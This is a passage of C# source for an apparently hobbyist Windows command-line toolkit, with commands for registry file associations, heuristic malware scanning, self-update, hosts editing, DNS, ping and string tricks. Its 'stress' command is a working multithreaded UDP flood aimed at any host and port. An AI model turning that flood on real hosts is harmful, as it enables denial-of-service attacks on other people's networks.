                            string[] sep = ar.Split('=')[0].Split('.');
                            arg = sep[0];
                            attr = ar.Substring(arg.Length + 1).Split('=')[0];
                            val = ar.Substring(arg.Length + 1).Split('=')[1];
                        }
                        else if (equ && !dot)
                        {
                            try
                            {
                                action = "setname";
                                string k = arg.Split('=')[0];
                                string v = arg.Split('=')[1];
                                if (r.OpenSubKey("." + k) == null) { r.CreateSubKey("." + k); }
                                if (r.OpenSubKey(v) == null) { r.CreateSubKey(v); }
                                if (r.OpenSubKey(v + "\\shell") == null) { r.OpenSubKey(v, true).CreateSubKey(v + "\\shell"); }
                                r.OpenSubKey("." + k, true).SetValue("", v);
                                t.ColorWrite("$a.{0} => $f{1}\n", k, v);
                                continue;
                            }
                            catch (Exception ex)
                            {
                                Error(ex);
                            }
                        }
                        else if (dot && !equ)
                        {
                            Error("Invalid arguments.");
                        }

                        string rg = "^" + Regex.Escape("." + arg).Replace(@"\*", ".*").Replace(@"\?", ".") + "$";

                        string[] Matched = r.GetSubKeyNames().Where(b => b.StartsWith(".") && Regex.IsMatch(b, rg)).ToArray();

                        if (Matched.Length > 50) { SimpleMode = true; } else { SimpleMode = false; }

                        foreach (string s in Matched)
                        {
                            string b = "";
#if (!DEBUG)
                                try
                                {
#endif
                            b = r.OpenSubKey(s).GetValue("").ToString();
                            RegistryKey o = null;
                            if (r.OpenSubKey(b) == null) { r.CreateSubKey(b); }
                            if (r.OpenSubKey(b + "\\shell") == null) { r.CreateSubKey(b + "\\shell"); }
                            if (action == "setattr")
                            {
                                o = r.OpenSubKey(b + "\\shell", true);
                                if (o.OpenSubKey(attr) == null) { o.CreateSubKey(attr); }
                                if (o.OpenSubKey(attr + "\\command") == null) { o.CreateSubKey(attr + "\\command"); }
                                o.OpenSubKey(attr + "\\command", true).SetValue("", val);
                            }
                            else
                            {
                                o = r.OpenSubKey(b + "\\shell");
                            }
                            string[] sbkn = o.GetSubKeyNames();
                            string[] vl = new string[sbkn.Length];
                            int i = 0;
                            foreach (string k in sbkn)
                            {
                                try
                                {
                                    if (SimpleMode)
                                    {
                                        vl[i++] = string.Format(" {0} -> {1}", k, o.OpenSubKey(k + "\\command").GetValue(""));
                                    }
                                    else
                                    {
                                        vl[i++] = string.Format("$e {0} -> $f{1}", k, o.OpenSubKey(k + "\\command").GetValue(""));
                                    }
                                }
                                catch (Exception)
                                {
                                    i--;
                                    if (SimpleMode)
                                    {
                                        vl[i++] = string.Format(" {0} -> {1}", k, "Error");
                                    }
                                    else
                                    {
                                        vl[i++] = string.Format("$e {0} -> $c{1}", k, "Error");
                                    }
                                }
                            }

                            RegistryKey props = r.OpenSubKey(b);
                            List<string> pstr = new List<string>();
                            if (a.GetPr("hi") != string.Empty)
                            {
                                bool hi = false;
                                bool.TryParse(a.GetPr("hi"), out hi);
                                if (hi)
                                {
                                    props.SetValue("NeverShowExt", "");
                                }
                                else
                                {
                                    props.DeleteValue("NeverShowExt");
                                }
                            }

                            if (SimpleMode)
                            {
                                t.WriteLine("{0} => {1}", s, b);
                                foreach (string ag in vl) { t.WriteLine(ag); }
                            }
                            else
                            {
                                t.ColorWrite("$a{0} => $f{1}", s, b);
                                foreach (string ag in vl) { t.ColorWrite(ag); }
                            }
                            t.WriteLine();
#if (!DEBUG)
                            }
                                catch (Exception)
                                {
                                    if (SimpleMode)
                                    {
                                        t.WriteLine("{0} => {1}(ERROR)\n", s, b);
                                    }
                                    else
                                    {
                                        t.ColorWrite("$a{0} => $c{1}(ERROR)\n", s, b);
                                    }
                                }
#endif
                        }
                    }

                    return null;
                },
            }.Save(C, new string[] { "assoc" });
            #endregion
            #region Scan Command
            new Command
            {
                Switches = new string[] { "s", "q" },
                Help = new CommandHelp
                {
                    Description = "Finds malware processes using heuristics",
                    Usage = new string[]
                    {
                                        "{NAME} /s $8Tries to solve the problem by killing processes and deleting files",
                                        "{NAME} /s /q $8Same as above but with no prompt"
                    }
                },
                Main = (Argumenter a) =>
                {
                    bool q = a.GetSw("q");
                    Regex[] rg = new Regex[]
                    {
                                        new Regex("([a-z][A-Z][a-z])"),
                                        new Regex("([A-Z][a-z][A-Z])"),
                                        new Regex("((.)\\2{3,4})", RegexOptions.IgnoreCase),
                                        new Regex("([~\\^\\[\\]=\\+\\-;,#\\$!@¨&\\(\\)§´`])", RegexOptions.IgnoreCase),
                    };
                    Regex scrp = new Regex("^[wc]script$", RegexOptions.IgnoreCase);
                    HashSet<string> Folders = new HashSet<string>();
                    HashSet<int> ids = new HashSet<int>();
                    HashSet<string> fls = new HashSet<string>();
                    foreach (Process p in Process.GetProcesses())
                    {
                        int dr = 0; // Detection rate
                        List<string> rs = new List<string>(); // Reasons
                        ProcessModule pm = null;
                        string fl = "";
                        try
                        {
                            pm = p.MainModule;
                            fl = pm.FileName;
                        }
                        catch (Exception) { }
                        if (fl == "") { continue; }
                        FileInfo fil = new FileInfo(fl);

                        int cm = 0;
                        //List<string> ab = new List<string>();
                        foreach (Regex r in rg)
                        {
                            //ab.Add(string.Format( "({0})", string.Join( "; ", mt.Groups.Cast<Group>().Select(t=>t.Value).ToArray())) );
                            foreach (Match mt in r.Matches(fil.Name))
                            {
                                cm++;
                            }
                        }
                        if (cm >= 6)
                        {
                            rs.Add("Erratic file name.");
                            dr += cm * 2;
                        }

                        if (fl != "")
                        {
                            bool hta = false;
                            if (scrp.Match(p.ProcessName).Success || (hta = p.ProcessName.ToLower() == "mshta"))
                            {
                                try
                                {
                                    string str = Funcs.GetCommandline(p);
                                    Match scn = Regex.Match(str, "\"([^\"]+)\"[^\"]*$");
                                    if (scn.Success)
                                    {
                                        fls.Add(scn.Groups[1].Value);
                                        if (hta)
                                        {
                                            rs.Add(string.Format("HTA host ({0}).", scn.Groups[1].Value));
                                        }
                                        else
                                        {
                                            rs.Add(string.Format("Script host ({0}).", scn.Groups[1].Value));
                                        }
                                        Folders.Add(new FileInfo(scn.Groups[1].Value).DirectoryName);
                                    }
                                    dr += 20;
                                }
                                catch (Exception)
                                {
                                }
                            }
                            if ((fil.Attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                            {
                                rs.Add("File is hidden.");
                                dr += 20;
                            }
                            if ((new FileInfo(fil.DirectoryName).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
                            {
                                rs.Add("Parent folder is hidden.");
                                dr += 20;
                            }
                            if (fl.ToLower().Contains(Environment.ExpandEnvironmentVariables("%windir%").ToLower()))
                            {
                                if (pm.FileVersionInfo.CompanyName != "Microsoft Corporation")
                                {
                                    rs.Add("Running from WinDir without Microsoft company name.");
                                    dr += 10;
                                }
                            }
                        }
                        if (fl.ToLower().Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToLower()))
                        {
                            rs.Add("Running from AppData.");
                            dr += 15;
                        }
                        if (fl.ToLower().Contains(Environment.ExpandEnvironmentVariables("%temp%").ToLower()))
                        {
                            rs.Add("Running from Temp.");
                            dr += 20;
                        }
                        if (dr >= 20)
                        {
                            ids.Add(p.Id);
                            t.ColorWrite("[{2} | {0}] $c({1})", p.ProcessName, dr, p.Id);
                            foreach (string r in rs)
                            {
                                t.ColorWrite("$e {0}", r);
                            }
                            t.WriteLine();
                        }
                    }
                    if (a.GetSw("s"))
                    {
                        List<string> Commands = new List<string>();
                        if (ids.Count > 0)
                        {
                            Commands.Add(string.Format("kpid {0}", string.Join(" ", ids.Select(b => b.ToString()).ToArray())));
                        }
                        if (fls.Count > 0)
                        {
                            foreach (string s in fls)
                            {
                                Commands.Add(string.Format("del \"{0}\" /f", s.Replace("\\", "/")));
                            }
                        }
                        if (!q)
                        {
                            t.ColorWrite("$cThese commands will be run:");
                            foreach (string s in Commands)
                            {
                                t.ColorWrite("$7{0}", s);
                            }
                            t.ColorWrite("$cType Y to confirm");
                            if ((t.ReadLine().ToLower() + " ")[0] != 'y')
                            {
                                return null;
                            }
                        }
                        foreach (string s in Commands)
                        {
                            m.RunCommand(s);
                        }
                    }
                    else
                    {
                        if (Folders.Count > 0)
                        {
                            t.ColorWrite("$2Possible infection folders:");
                            foreach (string s in Folders)
                            {
                                t.ColorWrite("$f {0}", s);
                            }
                        }
                    }
                    return null;
                },
            }.Save(C, new string[] { "scan" });
            #endregion
            #region Update Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Downloads the newest version from GitHub",
                    Usage = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {
                    FileInfo temp = Funcs.TempFile();
                    FileInfo script = Funcs.TempFile("bat");
                    FileInfo self = new FileInfo(m.FileName);
#if (DEBUG)
                    string st = "Debug";
#else
                    string st = "Release";
#endif
                    string uri = string.Format( "https://raw.githubusercontent.com/Falofa/Vulner/master/Vulner/bin/{0}/Vulner.exe", st );

                    m.RunCommand(string.Format("wget '{0}' '{1}'", uri, temp.FullName));
                    
                    if (script.Exists) {
                        script.Attributes = 0;
                        script.Delete();
                    }
                    TextWriter w = new StreamWriter( script.Create() );
                    //w.WriteLine("@echo off");
                    w.WriteLine("title \"Upgrading Vulner!\"");
                    w.WriteLine("taskkill /im \"{0}\"", self.Name);
                    w.WriteLine("del \"{0}\"", self.FullName);
                    w.WriteLine("copy \"{0}\" \"{1}\"", temp.FullName, self.FullName);
                    w.WriteLine("del \"{0}\"", temp.FullName);
                    w.WriteLine("explorer.exe \"{0}\"", self.FullName);
                    w.WriteLine("del \"%0\"");
                    w.WriteLine("exit");
                    w.Flush();
                    w.Close();
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = script.FullName,
                    }).WaitForExit();
                    return null;
                },
            }.Save(C, new string[] { "update" });
            #endregion
            #region Call Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Runs cmd and runs desired command",
                    Usage = new string[]
                    {
                        "{NAME} ping.exe google.com"
                    }
                },
                Main = (Argumenter a) =>
                {
                    string c = a.RawCmd.Length == 3 ? "" : a.RawCmd.Substring(5);
                    Process p = Process.Start(new ProcessStartInfo
                    {
                        FileName = Environment.ExpandEnvironmentVariables("%SystemRoot%/system32/cmd.exe"),
                        Arguments = string.Format("/k {0}", c),
                        WorkingDirectory = Environment.CurrentDirectory,
                    });
                    p.WaitForExit();
                    t.WriteLine("{0}", p.ExitCode);
                    return null;
                },
            }.Save(C, new string[] { "cmd" }, __debug__);
            #endregion
            #endregion

            #region String Commands
            #region Invisible Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Adds invisible characters in between given arguments",
                    LongDesc = "Makes it look normal but hard to type and compare it",
                    Usage = new string[]
                        {
                                        "{NAME} [arg]",
                                        "{NAME} [args] [args] [args]",
                        }
                },
                Main = (Argumenter a) =>
                {
                    char[] ch = "​|‌|‍|‎|‏|‪|‬|‭|⁡|⁢|⁣|⁪|⁫|⁬|⁮|⁯".Split('|').Select(b => b[0]).ToArray();
                    foreach (string s in a.Parsed.Skip(1).StringArray())
                    {
                        string r = "";
                        foreach (char c in s)
                        {
                            r += c;
                            r += ch[Funcs.Rnd(0, ch.Length - 1)];
                        }
                        t.WriteLine(r.Substring(0, r.Length - 1));
                    }
                    return null;
                },
            }.Save(C, new string[] { "invisible" }, __debug__);
            #endregion
            #region Weird Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Adds 'zalgo' characters in between given arguments",
                    LongDesc = "(Reference sheet: $bhttps://eeemo.net/$e)",
                    Examples = Util.Array("{NAME} 'text' > out.txt")
                },
                Main = (Argumenter a) =>
                {
                    char[] ch = new char[] { (char)0x030D, (char)0x030E, (char)0x0304, (char)0x0305, (char)0x033F, (char)0x0311, (char)0x0306, (char)0x0310, (char)0x0352, (char)0x0357, (char)0x0351, (char)0x0307, (char)0x0308, (char)0x030A, (char)0x0342, (char)0x0343, (char)0x0344, (char)0x034A, (char)0x034B, (char)0x034C, (char)0x0303, (char)0x0302, (char)0x030C, (char)0x0350, (char)0x0300, (char)0x0301, (char)0x030B, (char)0x030F, (char)0x0312, (char)0x0313, (char)0x0314, (char)0x033D, (char)0x0309, (char)0x0363, (char)0x0364, (char)0x0365, (char)0x0366, (char)0x0367, (char)0x0368, (char)0x0369, (char)0x036A, (char)0x036B, (char)0x036C, (char)0x036D, (char)0x036E, (char)0x036F, (char)0x033E, (char)0x035B, (char)0x0346, (char)0x031A, (char)0x0315, (char)0x031B, (char)0x0340, (char)0x0341, (char)0x0358, (char)0x0321, (char)0x0322, (char)0x0327, (char)0x0328, (char)0x0334, (char)0x0335, (char)0x0336, (char)0x034F, (char)0x035C, (char)0x035D, (char)0x035E, (char)0x035F, (char)0x0360, (char)0x0362, (char)0x0338, (char)0x0337, (char)0x0361, (char)0x0489, (char)0x0316, (char)0x0317, (char)0x0318, (char)0x0319, (char)0x031C, (char)0x031D, (char)0x031E, (char)0x031F, (char)0x0320, (char)0x0324, (char)0x0325, (char)0x0326, (char)0x0329, (char)0x032A, (char)0x032B, (char)0x032C, (char)0x032D, (char)0x032E, (char)0x032F, (char)0x0330, (char)0x0331, (char)0x0332, (char)0x0333, (char)0x0339, (char)0x033A, (char)0x033B, (char)0x033C, (char)0x0345, (char)0x0347, (char)0x0348, (char)0x0349, (char)0x034D, (char)0x034E, (char)0x0353, (char)0x0354, (char)0x0355, (char)0x0356, (char)0x0359, (char)0x035A, (char)0x0323 };
                    foreach (string s in a.Parsed.Skip(1).StringArray())
                    {
                        string r = "";
                        foreach (char c in s)
                        {
                            r += c;
                            for (int i = 0; i < Funcs.Rnd(5, 10); i++)
                            {
                                r += ch[Funcs.Rnd(0, ch.Length - 1)];
                            }
                        }
                        t.WriteLine(r);
                    }
                    return null;
                },
            }.Save(C, new string[] { "weird" }, __debug__);
            #endregion
            #region B64 Commands
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Encodes Base64 string",
                    Examples = Util.Array("{NAME} [String]")
                },
                Main = (Argumenter a) =>
                {
                    byte[] s = Encoding.UTF8.GetBytes(a.Get(1));
                    string str = Convert.ToBase64String(s);
                    t.WriteLine(str);
                    return str;
                },
            }.Save(C, new string[] { "btoa", "b64e" }, __debug__);
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Decodes Base64 string",
                    Examples = Util.Array("{NAME} [Base64]")
                },
                Main = (Argumenter a) =>
                {
                    string str = "";
                    try
                    {
                        byte[] s = Convert.FromBase64String(a.Get(1));
                        str = Encoding.UTF8.GetString(s);
                    }
                    catch (Exception) { }
                    t.WriteLine(str);
                    return str;
                },
            }.Save(C, new string[] { "atob", "b64d" }, __debug__);
            #endregion
            #region Explode Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Explodes arguments after the first one using the first one as a separator",
                    Examples = Util.Array("{NAME} ',' 'string 1,string 2,string 3' 'string 4'")
                },
                Main = (Argumenter a) =>
                {
                    string[] sep = new string[] { a.Get(1) };
                    List<string> re = new List<string>();
                    foreach (string b in a.Parsed.Skip(1).StringArray())
                    {
                        re.Concat(b.Split(sep, StringSplitOptions.None));
                    }
                    return re.ToArray();
                },
            }.Save(C, new string[] { "Explode" }, __debug__);
            #endregion
            #region Key Command
            Dictionary<char, string> chars = new Dictionary<char, string> {
                { 'H', "2346789BCDFGHJKMPQRTVWXY" },
                { '0', "0123456789" },
                { 'A', "ABCDEF" },
                { 'a', "ABCDEFabcdef" },
                { 'X', "0123456789ABCDEF" },
                { 'x', "0123456789ABCDEFabcdef" },
                { 'B', "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ" },
                { 'b', "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" },
                { '!', "ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõöøùúûüý" },
                { '@', "☺☻♥♦♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼" }
            };
            new Command
            {

                Help = new CommandHelp
                {
                    Description = "Creates a random key/uuid using the given format",
                    LongDesc = "\n".Join(chars.Select(o => string.Format("{0} - {1}", o.Key, o.Value)).ToArray()),
                    Examples = Util.Array(
                        "{NAME} XXXX-XXXX-XXXX $8-- Generic Key",
                        "{NAME} XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX $8-- UUID",
                        "{NAME} HHHHH-HHHHH-HHHHH-HHHHH-HHHHH $8-- Windows XP Key"
                    )
                },
                Main = (Argumenter a) =>
                {
                    string k = a.Get(1) == "" ? "XXXX-XXXX-XXXX" : a.Get(1);
                    for (int i = 0; i < 10; i++)
                    {
                        string s = new string(k.Select(b =>
                        {
                            if (chars.ContainsKey(b))
                            {
                                return chars[b][Funcs.Rnd(0, chars[b].Length)];
                            }
                            return b;
                        }).ToArray());
                        t.ColorWrite("$a{0}", s);
                    }
                    return null;
                },
            }.Save(C, new string[] { "key" }, __debug__);
            #endregion
            #region RS Command ( Random String )
            Dictionary<char, string> chr = new Dictionary<char, string> {
                { '0', "0123456789" },
                { 'A', "ABCDEF" },
                { 'a', "ABCDEFabcdef" },
                { 'X', "0123456789ABCDEF" },
                { 'x', "0123456789ABCDEFabcdef" },
                { 'B', "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ" },
                { 'b', "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" },
            };
            new Command
            {
                Parameters = Util.Array("a"),
                Help = new CommandHelp
                {
                    Description = "Generates a random string of a random length",
                    Usage = Util.Array("{NAME} [len]", "{NAME} [min] [max]"),
                    Param = new Dictionary<string, string> { { "a", "Alphabet to use" } },
                    LongDesc = @"Alphabets:
'0' = 0-9
'A' = A-F
'a' = A-Fa-f
'X' = 0-9A-F
'x' = 0-9A-Fa-f
'B' = 0-9A-Z
'b' = 0-9A-Za-z $8(def)",
                },
                Main = (Argumenter a) =>
                {
                    string alp = "";
                    try
                    {
                        alp = chr[Util.Or(a.GetPr("a"), "b", true)[0]];
                    }
                    catch (Exception) { return ""; }
                    int a_ = a.Int(1, -1);
                    int b_ = a.Int(2, -1);
                    bool min = a_ > 0;
                    bool max = b_ > 0;
                    string s = "";
                    if (min && max)
                    {
                        s = Funcs.RandomString(alp, a_, b_);
                    }
                    else if (min)
                    {
                        s = Funcs.RandomString(alp, a_);
                    }
                    t.WriteLine("{0}", s);
                    return s;
                },
            }.Save(C, new string[] { "rs" }, __debug__);
            #endregion
            #region Chars Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Gets a character list from a regex",
                    Examples = Util.Array("{NAME} a-zA-Z0-9")
                },
                Main = (Argumenter a) =>
                {
                    Regex r = null;
                    try
                    {
                        r = new Regex(string.Format("^[{0}]$", a.Get(1)));
                    }
                    catch (Exception)
                    {
                        t.ColorWrite("$cInvalid regex.");
                        return null;
                    }
                    string s = "";
                    for (int i = 0; i < 0xFF; i++)
                    {
                        if (r.IsMatch(((char)i).ToString()))
                        {
                            s += (char)i;
                        }
                    }
                    t.ColorWrite("$e{0}", s);
                    return null;
                },
            }.Save(C, new string[] { "chars" }, __debug__);
            #endregion
            #region MkWord Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Creates a random 'word'",
                    Usage = Util.Array("{NAME} [minsize=2] [maxsize=6] [count=1]")
                },
                Main = (Argumenter a) =>
                {
                    int c = a.Int(3, 1);
                    string r = "";
                    for (int i = 0; i < c; i++)
                    {
                        r = Funcs.MakeWord(a.Int(1, 2), a.Int(2, 6));
                        t.WriteLine(r);
                    }
                    return r;
                },
            }.Save(C, new string[] { "mkword" }, __debug__);
            #endregion
            #endregion

            #region Network Commands
            #region Hosts Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Prints and modifies windows hosts",
                    Usage = new string[]
                        {
                                    "{NAME}",
                                    "{NAME} localhost=127.0.0.1 otherhost.com=0.0.0.0"
                        }
                },
                Main = (Argumenter a) =>
                {
                    string hosts = Environment.ExpandEnvironmentVariables("%windir%\\system32\\drivers\\etc\\hosts");
                    bool write = false;
                    try
                    {
                        System.IO.File.OpenWrite(hosts).Close();
                        write = true;
                    }
                    catch (Exception) { } // Unauthorized!
                    if (!System.IO.File.Exists(hosts))
                    {
                        if (write)
                        {
                            System.IO.File.WriteAllBytes(hosts, new byte[0]);
                        }
                        else
                        {
                            t.ColorWrite("$cFile not found: $f{0}", hosts);
                            t.ColorWrite("$cRestart as admin to fix this problem.");
                            return null;
                        }
                    }

                    Dictionary<string, string> n = new Dictionary<string, string>();
                    if (write)
                    {
                        foreach (string st in a.Parsed.Skip(1).StringArray())
                        {
                            string[] b = null;
                            if ((b = st.Split('=')).Length != 2) continue;
                            if (Regex.IsMatch(b[1], @"[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}") || string.IsNullOrEmpty(b[1]))
                            {
                                n[b[0]] = b[1];
                            }
                            else
                            {
                                t.ColorWrite("$cInvalid IP Address: $f{0}", b[1]);
                            }
                        }
                    }
                    else if (a.Parsed.Length > 1)
                    {
                        t.ColorWrite("$cWriting to hosts requires root");
                        return null;
                    }

                    Dictionary<string, string> h = new Dictionary<string, string>();
                    Action ReadHosts = () =>
                    {
                        foreach (string s in System.IO.File.ReadAllLines(hosts))
                        {
                            string str = s.Trim();
                            string[] b = null;
                            if (str.StartsWith("#")) continue;
                            if ((b = str.Split(' ').Where(c => c.Trim() != "").ToArray()).Length != 2) continue;

                            h[b[1]] = b[0]; // H[ Domain ] = IP
                        }
                    };

                    ReadHosts();

                    List<string> change = new List<string>();
                    if (write && n.Count != 0)
                    {
                        foreach (KeyValuePair<string, string> k in n)
                        {
                            if (string.IsNullOrEmpty(k.Value))
                            {
                                h.Remove(k.Key);
                                change.Add(string.Format("$c- {0}", t.EscapeColor(k.Key)));
                            }
                            else
                            {
                                h[k.Key] = k.Value;
                                change.Add(string.Format("$e{0} = $f{1}", t.EscapeColor(k.Key), t.EscapeColor(k.Value)));
                            }
                        }
                        string res = "";
                        foreach (KeyValuePair<string, string> k in h)
                        {
                            res += string.Format("{0} {1}\n", k.Value, k.Key);
                        }
                        System.IO.File.WriteAllText(hosts, res);
                    }

                    if (change.Count == 0)
                    {
                        foreach (KeyValuePair<string, string> k in h)
                        {
                            t.ColorWrite("$e{0} = $f{1}", k.Key, k.Value);
                        }
                    }
                    else
                    {
                        foreach (string k in change)
                        {
                            t.ColorWrite(k);
                        }
                    }

                    return null;
                },
            }.Save(C, new string[] { "hosts" }, __debug__);
            #endregion
            #region Ping Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Tests connection speed to target host",
                    Usage = Util.Array("{NAME} [host]")
                },
                Main = (Argumenter a) =>
                {
                    IPAddress ip = null;
                    try
                    {
                        ip = Dns.GetHostAddresses(a.Get(1)).First();
                    }
                    catch (Exception)
                    {
                        t.ColorWrite("$cNo such host is known.");
                        return null;
                    }
                    t.ColorWrite("$fPinging [$e{0}$f]", ip.ToString());
                    Ping p = new Ping();
                    bool pinging = true;
                    long time = 0;
                    List<int> times = new List<int>();
                    Func<string, int, Writable> NewWritable = (s, i) =>
                    {
                        t.SetForeColor('a');
                        t.Write(s);
                        t.SetForeColor('e');
                        var temp = t.GetWritable(i);
                        t.WriteLine();
                        return temp;
                    };
                    var ctw = NewWritable("Current time: ", 15);
                    var atw = NewWritable("Average time: ", 15);
                    var btw = NewWritable("Peak time: ", 25);
                    var rtw = NewWritable("Requests: ", 15);
                    var dtw = NewWritable("Dropped: ", 15);
                    var ttw = NewWritable("Time passed: ", 15);
                    t.ColorReset();
                    int stt = Environment.TickCount;
                    Console.CursorVisible = false;
                    int dropped = 0;
                    int req = 0;
                    byte[] bt = Funcs.RandomBytes(64);
                    while (pinging && !a.Quit)
                    {
                        try
                        {
                            PingReply pr = p.Send(ip, 1000, bt);
                            time += Math.Max(pr.RoundtripTime * 2 - 30, 60);
                            req++;
                            if (pr.Status == IPStatus.Success || ((int)pr.RoundtripTime) == 0)
                            {
                                times.Add((int)pr.RoundtripTime);

                                ctw.Write(string.Format("{0}ms", pr.RoundtripTime));
                                atw.Write(string.Format("{0}ms", (int)times.Average()));

                                long big = times.OrderBy(b => -b).First();
                                long sml = times.OrderBy(b => b).First();
                                btw.Write(string.Format("{0}ms/{1}ms ({2}ms)", (int)big, (int)sml, (int)(big - sml)));
                                ttw.Write(string.Format("{0}s", Math.Round((double)(Environment.TickCount - stt) / 1000.0, 2).ToString("0.00")));
                            }
                            else { dropped++; }
                        }
                        catch (Exception) { time += 100; dropped++; }
                        rtw.Write(req);
                        dtw.Write(dropped);
                        if (time > 1e4) { pinging = false; }
                    }
                    Console.CursorVisible = true;
                    return null;
                },
            }.Save(C, new string[] { "ping" }, __debug__);
            #endregion
            #region DNS Command
            new Command
            {
                Switches = new string[] { "r" },
                Help = new CommandHelp
                {
                    Description = "Performs a DNS lookup",
                    Examples = new string[] {
                                                "{NAME} google.com",
                                                "{NAME} google.com /r",
                                                "{NAME} 8.8.8.8 /r",
                                            },
                    Usage = new string[] { "{NAME} [hostOrIp]" },
                    Switches = new Dictionary<string, string>() { { "r", "Reverse DNS lookup" } }
                },
                Main = (Argumenter a) =>
                {
                    int DnsTime = ServicePointManager.DnsRefreshTimeout;
                    ServicePointManager.DnsRefreshTimeout = 0;

                    try
                    {
                        IPAddress[] i = Dns.GetHostAddresses(a.Get(1));
                        if (a.GetSw("r")) { t.ColorWrite("$e{0} {1}", "[ IP ADDRESS ]".PadRight(16), "[ HOSTNAME ]".PadRight(16)); }
                        foreach (IPAddress ip in i)
                        {
                            if (a.GetSw("r"))
                            {
                                try
                                {
                                    IPHostEntry iph = Dns.GetHostEntry(ip);
                                    t.WriteLine("{0} {1}", ip.ToString().PadRight(16), iph.HostName);
                                }
                                catch (Exception)
                                {
                                    t.ColorWrite("{0} $cERROR", ip.ToString().PadRight(16));
                                }
                            }
                            else
                            {
                                t.WriteLine("{0}", ip.ToString());
                            }
                        }
                    }
                    catch (Exception)
                    {
                        t.ColorWrite("$cInvalid host.");
                    }

                    ServicePointManager.DnsRefreshTimeout = DnsTime;
                    return null;
                },
            }.Save(C, new string[] { "dns" });
            #endregion
            #region NetFix Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Flushes DNS cache and renews ipconfig",
                    Usage = new string[] { "{NAME}" }
                },
                Main = (Argumenter a) =>
                {
                    NetworkInterfaceType[] eth = new NetworkInterfaceType[] {
                        NetworkInterfaceType.Ethernet,
                        NetworkInterfaceType.Ethernet3Megabit,
                        NetworkInterfaceType.FastEthernetFx,
                        NetworkInterfaceType.FastEthernetT,
                        NetworkInterfaceType.GigabitEthernet
                    };
                    NetworkInterface ni = NetworkInterface.GetAllNetworkInterfaces().Where(n => eth.Contains(n.NetworkInterfaceType)).First();
                    if (ni == null)
                    {
                        t.ColorWrite("$cNetwork interface not found!");
                        return null;
                    }
                    IPInterfaceProperties p = ni.GetIPProperties();
                    IPAddressCollection ipa = p.DnsAddresses;
                    t.ColorWrite("$eChecking connection...");
                    string[] ips = Util.Array("google.com", "youtube.com", "gmail.com");
                    int sc = 0;
                    Ping png = new Ping();
                    foreach (string ip in ips)
                    {
                        try
                        {
                            IPAddress ipad = Dns.GetHostEntry(ip).AddressList.First();
                            PingReply pr = png.Send(ipad);
                            if (pr.Status == IPStatus.Success)
                                sc++;
                        }
                        catch (Exception) { }
                    }
                    if (sc == 0)
                    {
                        t.ColorWrite("$eEthernet is down!");
                    }
                    else
                    {
                        t.ColorWrite("$eEthernet is up!");
                        return null;
                    }
                    //IPInterfaceProperties ipi = new IPInterfaceProperties();//.DnsAddresses
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "ipconfig",
                        Arguments = "/flushdns",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                    }).WaitForExit();
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "ipconfig",
                        Arguments = "/renew",
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true,
                    });
                    t.ColorWrite("$eIp config renewed and dns cache flushed.");
                    return null;
                },
            }.Save(C, new string[] { "netfix" });
            #endregion
            #region Stress Command
            List<Thread> stress_ths = new List<Thread>();
            new Command
            {
                Parameters = Util.Array("t"),
                Help = new CommandHelp
                {
                    Description = "Stresses local network",
                    Param = new Dictionary<string, string> { { "t", "Thread count" } },
                    Usage = Util.Array("{NAME} -t 10", "{NAME} [host] [port] -t 10")
                },
                Main = (Argumenter a) =>
                {
                    int th = 5;
                    if (a.IsSetPr("t"))
                    {
                        int tmp = a.Int("t", 0);
                        if (tmp > 0)
                            th = tmp;
                    }
                    IPAddress ip = Dns.GetHostAddresses(a.Get(1)).First();
                    int port = a.Int(2, -1);
                    int nmb = 0;
                    int drp = 0;
                    Action Stress = () =>
                    {
                        UdpClient tcp = new UdpClient();
                        while (true)
                        {
                            try
                            {
                                tcp.Send(Funcs.RandomBytes(256), 256, ip.ToString(), (port == -1 ? (1 + Funcs.Rnd(100)) : port));
                                nmb++;
                            }
                            catch (Exception) { drp++; }
                        }
                    };
                    for (int i = 0; i < th; i++)
                    {
                        Thread thr = new Thread(() => Stress());
                        thr.Start();
                        stress_ths.Add(thr);
                    }
                    Writable c = t.QuickWritable("Packets sent: ", 25, 'a', 'e');
                    Writable b = t.QuickWritable("Packets dropped: ", 25, 'c', 'e');
                    Console.CursorVisible = false;
                    while (!a.Quit)
                    {
                        c.Write(nmb);
                        b.Write(drp);
                        Thread.Sleep(200);
                    }
                    return null;
                },
                Exit = () =>
                {
                    foreach (Thread th in stress_ths)
                    {
                        try
                        {
                            th.Abort();
                        }
                        catch (Exception) { }
                    }
                    stress_ths = new List<Thread>();
                    t.ColorWrite("$aAll threads killed.");
                }
            }.Save(C, new string[] { "stress" }, __debug__);
            #endregion
            #region LAN Command
            Dictionary<int, string> Ports = new Dictionary<int, string>
            {
                { 20,   "FTP" },
